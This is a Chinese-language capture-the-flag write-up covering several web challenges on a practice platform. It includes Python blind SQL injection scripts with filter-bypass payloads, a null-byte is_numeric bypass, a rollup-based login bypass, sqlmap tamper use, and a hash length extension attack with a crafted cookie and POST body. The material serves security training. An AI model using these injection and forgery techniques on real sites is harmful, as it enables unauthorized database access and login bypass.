<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">success = <span class="string">&#x27;You are in&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ctf5.shiyanbar.com/web/earnest/index.php&#x27;</span></span><br><span class="line">chrset = string.digits + string.ascii_lowercase + <span class="string">&#x27;_!~&#x27;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  val = <span class="string">&quot;0&#x27;oorr((select(mid(group_concat(table_name separatoorr &#x27;@&#x27;)from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())=&#x27;&#x27;)oorr&#x27;0&quot;</span> % i</span><br><span class="line">  data = &#123;<span class="string">&#x27;id&#x27;</span>: val.replace(<span class="string">&#x27; &#x27;</span>, <span class="built_in">chr</span>(<span class="number">0x0a</span>))&#125;</span><br><span class="line">  print(data)</span><br><span class="line">  r = requests.post(url, data=data)</span><br><span class="line">  <span class="keyword">if</span> success <span class="keyword">in</span> r.text:</span><br><span class="line">    print(<span class="string">&#x27;Finished, len = %s&#x27;</span> % i)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>得到所有表名连接起来后，包含分隔符<code>@</code>的总长为10。爆表名：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">success = <span class="string">&#x27;You are in&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ctf5.shiyanbar.com/web/earnest/index.php&#x27;</span></span><br><span class="line">chrset = string.digits + string.ascii_lowercase + <span class="string">&#x27;_!~@&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">12</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> chrset:</span><br><span class="line">    val = <span class="string">&quot;0&#x27;oorr((select(mid(group_concat(table_name separatoorr &#x27;@&#x27;)from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())=&#x27;%s&#x27;)oorr&#x27;0&quot;</span> % (i, j)</span><br><span class="line">    data = &#123;<span class="string">&#x27;id&#x27;</span>: val.replace(<span class="string">&#x27; &#x27;</span>, <span class="built_in">chr</span>(<span class="number">0x0a</span>))&#125;</span><br><span class="line">    print(data)</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">in</span> r.text:</span><br><span class="line">      table += j</span><br><span class="line">      print(table)</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>得到表名<code>fiag</code>和<code>users</code>，显然前者是我们需要的。用同样的方法爆列名长度和列名<code>fl$4g</code>。最后爆flag内容的长度：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">success = <span class="string">&#x27;You are in&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ctf5.shiyanbar.com/web/earnest/index.php&#x27;</span></span><br><span class="line">chrset = string.digits + string.ascii_lowercase + <span class="string">r&#x27;_~=+-*/&#123;\&#125;?!:@#$%&amp;()[],.&#x27;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  val = <span class="string">&quot;0&#x27;oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))=&#x27;&#x27;)oorr&#x27;0&quot;</span> % i</span><br><span class="line">  data = &#123;<span class="string">&#x27;id&#x27;</span>: val.replace(<span class="string">&#x27; &#x27;</span>, <span class="built_in">chr</span>(<span class="number">0x0a</span>))&#125;</span><br><span class="line">  print(data)</span><br><span class="line">  r = requests.post(url, data=data)</span><br><span class="line">  <span class="keyword">if</span> success <span class="keyword">in</span> r.text:</span><br><span class="line">    print(<span class="string">&#x27;Finished, len = %s&#x27;</span> % i)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>得长度为13，爆flag内容：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">success = <span class="string">&#x27;You are in&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ctf5.shiyanbar.com/web/earnest/index.php&#x27;</span></span><br><span class="line">chrset = string.digits + string.ascii_lowercase + <span class="string">r&#x27;_~=+-*/&#123;\&#125;?!:@#$%&amp;()[],.&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">14</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> chrset:</span><br><span class="line">    val = <span class="string">&quot;0&#x27;oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))=&#x27;%s&#x27;)oorr&#x27;0&quot;</span> % (i, j)</span><br><span class="line">    data = &#123;<span class="string">&#x27;id&#x27;</span>: val.replace(<span class="string">&#x27; &#x27;</span>, <span class="built_in">chr</span>(<span class="number">0x0a</span>))&#125;</span><br><span class="line">    print(data)</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">in</span> r.text:</span><br><span class="line">      flag += j</span><br><span class="line">      print(flag)</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>得到<code>flag&#123;haha~you</code>，很明显并不完整。将数字改大后再跑一次，得到<code>flag&#123;haha~you-win&#125;----</code>，注意到右花括号后面是若干个<code>-</code>，应该忽略。提交后发现答案错误。</p>
<p>这时候就需要考虑右花括号后面全都是<code>-</code>的原因了。我们构造的payload，简化后写出来就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;0&#39; or (select mid(fl$4g from(i) for(1)) from fiag) &#x3D; &#39;-&#39; or &#39;0</span><br></pre></td></tr></table></figure>

<p>其中<code>i</code>是数字，表示<code>fl$4g</code>的第<code>i</code>个字符。当显示<code>You are in</code>时停止，也就是说此时，下面这个值为<code>True</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="keyword">mid</span>(fl$<span class="number">4</span>g <span class="keyword">from</span>(i) <span class="keyword">for</span>(<span class="number">1</span>)) <span class="keyword">from</span> fiag) = <span class="string">&#x27;-&#x27;</span></span><br></pre></td></tr></table></figure>
<p>当<code>i</code>大于等于20时，显然此时<code>fl$4g</code>这一列的对应内容已经为空了，但是却依然能等于<code>-</code>。这说明服务端通过某种方式将空格转义成了<code>-</code>。因此真正的flag应该进行反转义，得到<code>flag&#123;haha~you win!&#125;</code>。</p>
<h2 id="你真的会PHP吗？"><a href="#你真的会PHP吗？" class="headerlink" title="你真的会PHP吗？"></a>你真的会PHP吗？</h2><p>响应头中有提示<code>6c525af4059b4fe7d8c33a.txt</code>，得到代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$info = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$req = [];</span><br><span class="line">$flag=<span class="string">&quot;xxxxxxxxxx&quot;</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&quot;display_error&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;number&#x27;</span>]))&#123;</span><br><span class="line">   header(<span class="string">&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">die</span>(<span class="string">&quot;have a fun!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>([$_POST] <span class="keyword">as</span> $global_var) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $value = trim($value);</span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span>(<span class="params">$number</span>) </span>&#123;</span><br><span class="line">    $number = strval($number);</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    $j = strlen($number) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>($i &lt; $j) &#123;</span><br><span class="line">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $i++;</span><br><span class="line">        $j--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">&#x27;number&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">   $info=<span class="string">&quot;sorry, you cann&#x27;t input a number!&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">elseif</span>($req[<span class="string">&#x27;number&#x27;</span>]!=strval(intval($req[<span class="string">&#x27;number&#x27;</span>])))&#123;</span><br><span class="line"></span><br><span class="line">     $info = <span class="string">&quot;number must be equal to it&#x27;s integer!! &quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[<span class="string">&quot;number&quot;</span>]);</span><br><span class="line">     $value2 = intval(strrev($req[<span class="string">&quot;number&quot;</span>]));</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>($value1!=$value2)&#123;</span><br><span class="line">          $info=<span class="string">&quot;no, this is not a palindrome number!&quot;</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">&quot;number&quot;</span>]))&#123;</span><br><span class="line">              $info = <span class="string">&quot;nice! <span class="subst">&#123;$value1&#125;</span> is a palindrome number!&quot;</span>;</span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $info;</span><br></pre></td></tr></table></figure>


<p>随后就是源码审计了，<code>number</code>不能为空且需要绕过<code>is_numeric</code>，同时还不能是回文数，但是将这个数前后颠倒得到的数值应等于它本身。</p>
<p>在32位系统上运行的PHP会把大于2147483647的数值认为是等于2147483647的，因此2147483647前后颠倒，对PHP来说其数值等于它本身。最后用<code>%00</code>绕过<code>is_numeric</code>即可，payload：<code>2147483647%00</code>。</p>
<h2 id="登陆一下好吗？？"><a href="#登陆一下好吗？？" class="headerlink" title="登陆一下好吗？？"></a>登陆一下好吗？？</h2><p>能过滤的都过滤了，利用万能密码<code>&#39;=&#39;</code>。原理：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where username = &#x27;&#x27;=&#x27;&#x27; and password = &#x27;&#x27;=&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<p>其中<code>username=&#39;&#39;</code>结果为<code>false</code>，这和空字符串被认为是相等的。</p>
<h2 id="因缺斯汀的绕过"><a href="#因缺斯汀的绕过" class="headerlink" title="因缺斯汀的绕过"></a>因缺斯汀的绕过</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35078631/article/details/54772798">参考博客，包含关于rollup的生动阐释</a></p>
<p>F12发现<code>source.txt</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;pwd&#x27;</span>])) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;input type=&quot;submit&quot; /&gt;&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;!--source: source.txt--&gt;&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span>(<span class="params">$StrKey,$StrValue,$ArrReq</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/&quot;</span>.$ArrReq.<span class="string">&quot;/is&quot;</span>,$StrValue)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;姘村彲杞借垷锛屼害鍙禌鑹囷紒&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = <span class="string">&quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(<span class="string">&quot;XXXXXX&quot;</span>,<span class="string">&quot;XXXXXX&quot;</span>,<span class="string">&quot;XXXXXX&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=<span class="string">&quot;XXXXXX&quot;</span>;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM interest WHERE uname = &#x27;<span class="subst">&#123;$_POST[&#x27;uname&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123;</span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">&#x27;pwd&#x27;</span>] == $_POST[<span class="string">&#x27;pwd&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;CTF&#123;XXXXXX&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;浜﹀彲璧涜墖锛�&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;涓€棰楄禌鑹囷紒&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>可以看到过滤了很多注入关键字以及数组绕过等姿势，随后根据用户输入的<code>uname</code>去查询数据库中的<code>pwd</code>，然后和用户POST的<code>pwd</code>比较，一致则通过。注意到这里也是一个弱等号，因此可以考虑空值绕过。还要注意查询输出的结果必须只有一行。</p>
<p>先查看表里一共有几行数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1 limit 1 offset 0#</span><br><span class="line">1&#39; or 1 limit 1 offset 1#</span><br><span class="line">1&#39; or 1 limit 1 offset 2#</span><br></pre></td></tr></table></figure>

<p>前两条都返回<code>浜﹀彲璧涜墖锛�</code>，而第三条返回<code>涓€棰楄禌鑹囷紒</code>（这里的乱码是因为编码问题，懒得转换了），因此表里一共只有两条数据。那么怎么插入一条新的数据，使得其中的<code>pwd</code>为<code>NULL</code>呢？</p>
<p>我们可以利用<code>rollup</code>统计功能实现。构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1 group by pwd with rollup limit 1 offset 2#</span><br></pre></td></tr></table></figure>
<p>注意这里的顺序。先<code>group by pwd with rollup</code>插入一条<code>pwd</code>为<code>NULL</code>的统计数据，然后<code>limit 1 offset 2</code>取最新的这一条数据。此时，由于我们POST的<code>pwd</code>也是空，因此通过验证。</p>
<h2 id="简单的sql注入之3-2-1"><a href="#简单的sql注入之3-2-1" class="headerlink" title="简单的sql注入之3/2/1"></a>简单的sql注入之3/2/1</h2><p>第三题sqlmap报错注入。</p>
<p>第二题还是sqlmap，不过由于过滤空格（和右括号）需要<code>--tamper=space2comment</code>。</p>
<p>不知道为什么第一题似乎和第二题一样。</p>
<h2 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ctf5.shiyanbar.com/web/10/10.php&#x27;</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(response.headers[<span class="string">&#x27;FLAG&#x27;</span>]).decode().split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;key&#x27;</span>: flag&#125;</span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<h2 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h2><p>抓包发现cookie中存在<code>source=0</code>，改为1即可查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">&quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;</span>;</span><br><span class="line">$secret = <span class="string">&quot;XXXXXXXXXXXXXXX&quot;</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">$password = $_POST[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">&quot;getmein&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">&quot;admin&quot;</span> &amp;&amp; urldecode($password) != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">&quot;getmein&quot;</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Congratulations! You are a registered user.\n&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The flag is &quot;</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;You are not an admin! LEAVE.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">&quot;sample-hash&quot;</span>, md5($secret . urldecode(<span class="string">&quot;admin&quot;</span> . <span class="string">&quot;admin&quot;</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">&quot;source&quot;</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">&quot;source&quot;</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">&quot;source&quot;</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>可以看到，我们需要设置cookie中的<code>getmein</code>为<code>secret||username||password</code>的MD5值，其中<code>username</code>为<code>admin</code>，<code>password</code>不能为<code>admin</code>，且<code>secret</code>未知，但长度为15字节。</p>
<p>我们还知道，数据包中的<code>sample-hash</code>的值就是<code>secret||&#39;admin&#39;||&#39;admin&#39;</code>的MD5值，而这个值是已知的。因此，这显然是哈希长度扩展攻击的模板题。参考<a href="https://signormercurio.me/post/HashLenExtAtk/">哈希长度扩展攻击</a>。具体命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hash_extender --data admin --secret 20 --append append --signature 571580b26c65f306376d4f64e53cb5c7 --format md5</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>这里<code>secret</code>长度为题目给出的15加上<code>admin</code>的长度5，结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Type: md5</span><br><span class="line">Secret length: 20</span><br><span class="line">New signature: 83f2684d54049c211e191f27902caaaf</span><br><span class="line">New string: 61646d696e80000000000000000000000000000000000000000000000000000000000000c800000000000000617070656e64</span><br></pre></td></tr></table></figure>

<p>因此在cookie中设置<code>getmein=83f2684d54049c211e191f27902caaaf</code>，POST数据为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&amp;password&#x3D;admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00append</span><br></pre></td></tr></table></figure>

<p>发包后得到flag。</p>
<h2 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h2><p>仔细读它给的注释，可以想到<code>index.php/index.php</code>的方式。</p>
<h2 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h2><p>抓包发现存在<code>showsource</code>参数，改成1就能看到源码，<code>PIN</code>码被写死在代码里了。</p>
